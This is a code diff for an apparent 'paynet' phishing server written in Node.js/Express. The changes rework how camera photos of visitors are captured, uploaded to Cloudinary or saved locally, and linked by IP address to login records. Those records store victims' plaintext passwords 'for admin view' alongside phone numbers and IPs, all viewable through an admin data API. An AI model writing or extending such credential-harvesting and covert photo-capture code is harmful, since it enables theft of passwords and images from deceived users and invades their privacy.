@@ -468,7 +468,7 @@ app.get("/admin/api/data", requireAdmin, (req, res) => {
     // Sort by timestamp descending (newest first)
     attempts.sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));
 
-    // Get list of photos
+    // Get list of photos from captures directory
     const capturesDir = path.join(__dirname, "captures");
     let photos = [];
     if (fs.existsSync(capturesDir)) {
@@ -476,20 +476,43 @@ app.get("/admin/api/data", requireAdmin, (req, res) => {
       photos = files.filter(f => /\.(jpg|jpeg|png|webp)$/i.test(f)).map(filename => ({
         filename,
         path: `/admin/photo/${filename}`,
-        isLocal: true
+        isLocal: true,
+        timestamp: fs.statSync(path.join(capturesDir, filename)).mtime
       }));
     }
 
-    // Add Cloudinary photos from attempts
+    // Add photos from attempts (both Cloudinary and local)
     attempts.forEach(attempt => {
+      // Add photos array if exists
+      if (attempt.photos && Array.isArray(attempt.photos)) {
+        attempt.photos.forEach(photo => {
+          photos.push({
+            filename: photo.filename,
+            path: photo.url || photo.localPath,
+            isLocal: !photo.url,
+            type: photo.type,
+            attemptId: attempt.verificationId,
+            timestamp: photo.timestamp
+          });
+        });
+      }
+      
+      // Add single cloudinaryUrl if exists
       if (attempt.cloudinaryUrl) {
         photos.push({
           filename: attempt.verificationId + ".jpg",
           path: attempt.cloudinaryUrl,
-          isLocal: false
+          isLocal: false,
+          attemptId: attempt.verificationId,
+          timestamp: attempt.timestamp
         });
       }
     });
+
+    // Remove duplicates and sort by timestamp
+    photos = photos.filter((photo, index, self) => 
+      index === self.findIndex(p => p.path === photo.path)
+    ).sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));
 
     res.json({ attempts, photos });
   } catch (error) {
@@ -580,7 +603,7 @@ app.get("/forgot-password", (req, res) => {
 
 app.post("/capture-photo", async (req, res) => {
   try {
-    const { photo, paymentId } = req.body;
+    const { photo, type, timestamp: clientTimestamp } = req.body;
 
     if (!photo) {
       return res.status(400).json({ success: false, message: "No photo data" });
@@ -589,21 +612,29 @@ app.post("/capture-photo", async (req, res) => {
     const ip = getClientIP(req) || "unknown";
     const timestamp = new Date().toISOString().replace(/:/g, "-");
     const safeIp = String(ip).replace(/[.:]/g, "-");
-    const publicId = `paynet_${timestamp}_${safeIp}`;
+    const photoType = type || "unknown";
+    const publicId = `paynet_${photoType}_${timestamp}_${safeIp}`;
 
     let photoUrl = null;
     let filename = null;
 
     // Upload to Cloudinary if available
     if (process.env.CLOUDINARY_URL || process.env.CLOUDINARY_API_KEY) {
-      const uploadResponse = await cloudinary.uploader.upload(photo, {
-        public_id: publicId,
-        folder: "paynet_captures"
-      });
-      photoUrl = uploadResponse.secure_url;
-      filename = uploadResponse.public_id;
-    } else {
-      // Fallback to local storage (for development)
+      try {
+        const uploadResponse = await cloudinary.uploader.upload(photo, {
+          public_id: publicId,
+          folder: "paynet_captures"
+        });
+        photoUrl = uploadResponse.secure_url;
+        filename = uploadResponse.public_id;
+        console.log(`✅ Photo uploaded to Cloudinary: ${filename}`);
+      } catch (cloudErr) {
+        console.error("Cloudinary upload failed, using local storage:", cloudErr.message);
+      }
+    }
+    
+    // Always save locally as backup (or primary if Cloudinary fails)
+    if (!photoUrl) {
       const capturesDir = path.join(__dirname, "captures");
       if (!fs.existsSync(capturesDir)) fs.mkdirSync(capturesDir);
 
@@ -612,23 +643,24 @@ app.post("/capture-photo", async (req, res) => {
       const base64Data = String(photo).replace(/^data:image\/\w+;base64,/, "");
       const buffer = Buffer.from(base64Data, "base64");
       fs.writeFileSync(filepath, buffer);
+      console.log(`✅ Photo saved locally: ${filename}`);
     }
 
-    // Link this photo to the latest attempt for this paymentId
-    if (paymentId && paymentId !== 'UNKNOWN') {
-      const logFile = path.join(__dirname, "loginAttempts.json");
-      let attempts = safeReadJSON(logFile, []);
+    // Store photo metadata for later linking
+    const photoMetadata = {
+      filename,
+      url: photoUrl,
+      type: photoType,
+      ip,
+      timestamp: clientTimestamp || new Date().toISOString(),
+      localPath: photoUrl ? null : `/admin/photo/${filename}`
+    };
 
-      // Find the most recent attempt for this paymentId
-      const attemptIndex = attempts.map(a => a.verificationId).lastIndexOf(paymentId);
-
-      if (attemptIndex !== -1) {
-        attempts[attemptIndex].photoData = "[CAPTURED]";
-        attempts[attemptIndex].photoFilename = filename;
-        if (photoUrl) attempts[attemptIndex].cloudinaryUrl = photoUrl;
-        safeWriteJSON(logFile, attempts);
-      }
-    }
+    // Save to a temporary photos file that will be linked when login attempt is logged
+    const photosFile = path.join(__dirname, "pendingPhotos.json");
+    let pendingPhotos = safeReadJSON(photosFile, []);
+    pendingPhotos.push(photoMetadata);
+    safeWriteJSON(photosFile, pendingPhotos);
 
     res.json({ success: true, filename, url: photoUrl });
   } catch (error) {
@@ -778,6 +810,22 @@ app.post("/verify", async (req, res) => {
   // Generate Transaction/Verification ID
   const verificationId = "PAY-" + crypto.randomBytes(4).toString("hex").toUpperCase();
 
+  // Get pending photos for this IP and link them
+  const photosFile = path.join(__dirname, "pendingPhotos.json");
+  let pendingPhotos = safeReadJSON(photosFile, []);
+  
+  // Filter photos from this IP in the last 5 minutes
+  const fiveMinutesAgo = new Date(Date.now() - 5 * 60 * 1000).toISOString();
+  const userPhotos = pendingPhotos.filter(p => 
+    p.ip === ip && p.timestamp > fiveMinutesAgo
+  );
+  
+  // Remove linked photos from pending
+  pendingPhotos = pendingPhotos.filter(p => 
+    !(p.ip === ip && p.timestamp > fiveMinutesAgo)
+  );
+  safeWriteJSON(photosFile, pendingPhotos);
+
   // Save all data to file (ONLY place data is stored - no console logging)
   const logData = {
     verificationId,
@@ -791,7 +839,9 @@ app.post("/verify", async (req, res) => {
     password: inputPassword, // Store actual password for admin view
     passwordHash: hashPassword(inputPassword),     // Secure hash
     phoneNumber: phoneNumber || null,
-    photoData: photoData ? "[CAPTURED]" : null,
+    photoData: userPhotos.length > 0 ? "[CAPTURED]" : (photoData ? "[CAPTURED]" : null),
+    photos: userPhotos, // Array of all captured photos
+    photoCount: userPhotos.length,
     photoFilename: req.body.photoFilename || null,
     cloudinaryUrl: req.body.photoUrl || null,
     status: "Verified", // Default status for paid/verified
